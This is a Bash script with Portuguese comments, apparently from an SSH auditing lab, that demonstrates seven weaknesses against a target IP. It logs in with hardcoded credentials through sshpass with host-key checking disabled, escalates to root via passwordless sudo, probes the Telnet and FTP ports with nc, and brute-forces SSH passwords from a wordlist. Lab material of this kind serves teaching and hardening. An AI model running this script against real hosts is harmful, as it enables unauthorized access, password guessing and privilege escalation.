#!/bin/bash
# auditoria-ssh-lab/exploits-safe/exploit.sh
# Script para demonstrar a exploração das 7 vulnerabilidades descritas no README.md

# --- Validação de Entrada ---
if [ -z "$1" ]; then
    echo "Uso: $0 <IP_DA_VITIMA>"
    exit 1
fi

VICTIM_IP=$1

# --- Cores para o output ---
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

exploit_success() {
    echo -e "${GREEN}[+] SUCESSO:${NC} $1"
}

exploit_fail() {
    echo -e "${RED}[-] FALHA:${NC} $1"
}

echo "Iniciando a exploração de vulnerabilidades no alvo: $VICTIM_IP"
echo "======================================================"

# --- Chave 1: Engenharia Social (A Nota Adesiva Digital) ---
echo "[*] Chave 1: Tentando explorar a vulnerabilidade de Engenharia Social..."
# Simulação, conforme README.md: o atacante encontrou as credenciais.
USERNAME="professor"
PASSWORD="Prof1234"
exploit_success "Credenciais simuladas encontradas! Usuário/Senha: $USERNAME/$PASSWORD"

# --- Chave 2: A Porta da Frente Aberta (SSH com Senha) ---
echo "[*] Chave 2: Tentando acesso SSH com as credenciais vazadas..."
# Tenta executar um comando simples via SSH para confirmar o acesso.
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "echo 'Conexão SSH estabelecida com sucesso.'" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    exploit_success "Acesso SSH com senha para o usuário '$USERNAME' bem-sucedido."
else
    exploit_fail "Acesso SSH com senha para o usuário '$USERNAME' falhou."
    exit 1
fi

# --- Chave 3: Privilégios de Super-Herói (Sudo sem Senha) ---
echo "[*] Chave 3: Tentando escalar privilégios com 'sudo' sem senha..."
SUDO_OUTPUT=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "sudo id")
if echo "$SUDO_OUTPUT" | grep -q "uid=0(root)"; then
    exploit_success "Escalonamento de privilégios para 'root' bem-sucedido."
    echo "    Saída do comando 'sudo id': $SUDO_OUTPUT"
else
    exploit_fail "Escalonamento de privilégios para 'root' falhou."
fi

# --- Chave 4 & 5: Serviços Inseguros e Firewall Desativado ---
echo "[*] Chave 4 e 5: Verificando serviços inseguros (FTP/Telnet) e ausência de firewall..."
# A capacidade de verificar estas portas demonstra que o firewall está inativo (Chave 5).
nc -z -v $VICTIM_IP 23 > /dev/null 2>&1
if [ $? -eq 0 ]; then
    exploit_success "Porta 23 (Telnet) está aberta e acessível."
else
    exploit_fail "Porta 23 (Telnet) está fechada ou inacessível."
fi

nc -z -v $VICTIM_IP 21 > /dev/null 2>&1
if [ $? -eq 0 ]; then
    exploit_success "Porta 21 (FTP) está aberta e acessível."
else
    exploit_fail "Porta 21 (FTP) está fechada ou inacessível."
fi

# --- Chave 6: Política de Senhas Fraca ---
echo "[*] Chave 6: Simulando ataque de força bruta para demonstrar política de senhas fraca..."
WORDLIST=($(cat /tmp/wordlist_small.txt))
BRUTE_FORCE_SUCCESS=false
for pass in "${WORDLIST[@]}"; do
    echo "    Tentando senha: $pass"
    if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $USERNAME@$VICTIM_IP "exit" > /dev/null 2>&1; then
        exploit_success "Senha encontrada por força bruta: $pass"
        BRUTE_FORCE_SUCCESS=true
        break
    fi
done
if [ "$BRUTE_FORCE_SUCCESS" = false ]; then
    exploit_fail "Nenhuma senha encontrada na wordlist."
fi

# --- Chave 7: Sistema sem Hardening ---
echo "[*] Chave 7: A exploração bem-sucedida das chaves anteriores demonstra um sistema sem hardening."
exploit_success "A combinação de credenciais expostas, SSH com senha, sudo sem senha, serviços inseguros e ausência de firewall confirma a falta de hardening no sistema."

echo "\n======================================================"
echo "Exploração concluída."